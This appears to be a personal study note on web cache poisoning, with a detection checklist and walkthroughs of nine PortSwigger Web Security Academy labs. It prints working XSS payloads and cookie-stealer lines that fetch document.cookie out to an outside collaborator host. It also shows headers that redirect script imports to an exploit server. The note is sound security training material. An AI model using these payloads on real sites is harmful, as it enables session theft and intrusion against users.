## Approach

1. Does it have `X-Cache` + reflected input in (`/resources/js/something.js`) |  `<link rel="canonical"` ? 

> If yes, then check for **web cache poisoning**

2. ***Burp Scanner*** can detect it also, **not very well tho**
3. `Pragma: x-get-cache-key`, to see what's the **cache key**
4. Use `Param Miner` -> `Guess Headers`, helps in finding hidden headers
5. Check for unkeyed and reflected: 
	- [ ] `X-Forwarded-Host` and `X-Host` headers
	- [ ] `utm_content` param
	- [ ] Double `Host` headers
	- [ ] Delimiter discrepancy `;`
	- [ ] Body can include params

## Exploit server

**Path**

`/resources/js/tracking.js`

***alert()* payload**

```js
alert(document.cookie)
```

**Cookie stealer**

```js
fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`);
```

## Labs
### [1. Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)

> [!NOTE] 
> Unkeyed header `X-Forwarded-Host` and reflected as the `src` for an import JS file `<script>`, use the exploit server to host malicious JS 

```
GET / HTTP/1.1
Host: 0a0c0021041e3d9e80a67682004500d7.web-security-academy.net
...
X-Forwarded-Host: exploit-0a00006304f03d4980d37571015100cd.exploit-server.net
```

![](attachments/Pasted%20image%2020260102195940.png)
### [2. Web cache poisoning with an unkeyed cookie](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie)

> [!NOTE] 
> Unkeyed cookie `fehost` and also reflected on response allowing XSS 

![](attachments/Pasted%20image%2020260102201724.png)

***alert(1)* payload**

```
Cookie: session=[SESSION]; fehost="-alert(1)}//
```

**Cookie stealer**

```
Cookie: session=[SESSION]; fehost="-fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`)}//
```

### [3. Targeted web cache poisoning using an unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)

> [!NOTE] 
> It uses unkeyed `X-Host` header that is reflected as `src` for JS import `/resources/js/tracking.js` and only servers cache based on `User-Agent` can be seen through `Vary: User-Agent`

```
GET / HTTP/1.1
Host: 0aaf0056043c411c810a2f5600f30012.h1-web-security-academy.net
...
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
...
X-Host: exploit-0a6c0001049a415181712e0d014500ae.exploit-server.net
```

![](attachments/Pasted%20image%2020260102205109.png)

### [4. Web cache poisoning via an unkeyed query string](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)

> [!NOTE] 
> query string is **unkeyed** and reflected in **cannonical link** 

![](attachments/Pasted%20image%2020260102212514.png)

***alert(1)* payload**

```
?cb='><script>alert(1)</script>
```

**Cookie stealer**

```
?cb='><script>fetch(`//pib7qa8sybpe9mv769rg8m8eu50zorcg.oastify.com?c=${btoa(document.cookie)}`)</script>
```

### [5. Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)

> [!NOTE] 
> **Cannonical link** reflects URL allowing XSS, **unkeyed** `utm_content` makes poisoning possible

![](attachments/Pasted%20image%2020260102211051.png)

***alert(1)* payload**

```
utm_content='><script>alert(1);</script>
```

**Cookie stealer**

```
utm_content='><script>fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`);</script>
```

### [6. Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

> [!NOTE] 
> There is a discrepancy where two callback causing the second to be processed, also there's a delimiter discrepancy `;` 

![](attachments/Pasted%20image%2020260102223636.png)

***alert(1)* payload**

```
/js/geolocate.js?callback=setCountryCookie&utm_content=123;callback=alert(1)
```

**Cookie stealer**

```
/js/geolocate.js?callback=setCountryCookie&utm_content=123;callback=fetch(`//d6kveywgmzd2xajvuxf4waw2itonch06.oastify.com?c=${btoa(document.cookie)}`)
```

### [7. Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)

> [!NOTE] 
> The app accepts **double `Host` headers**, the second **Host** header is reflected as the JS import but the first is accepted as accessing the victim app

![](attachments/Pasted%20image%2020260102215512.png)

### [8. Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)

> [!NOTE] 
> Headers `X-Forwarded-Host` and `X-Forwarded-Scheme`, when you set `X-Forwarded-Scheme` to **http** it forces a redirect to **https** but the redirection is controllable via `X-Forwarded-Host` allowing XSS payload via **exploit server**

![](attachments/Pasted%20image%2020260102225332.png)

### [9. Web cache poisoning via a fat GET request](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

> [!NOTE] 
> The GET request can include a `callback`param in the body allowing, overwrite and discrepancy between cache and server, `callback` param value is reflected in response

![](attachments/Pasted%20image%2020260102230630.png)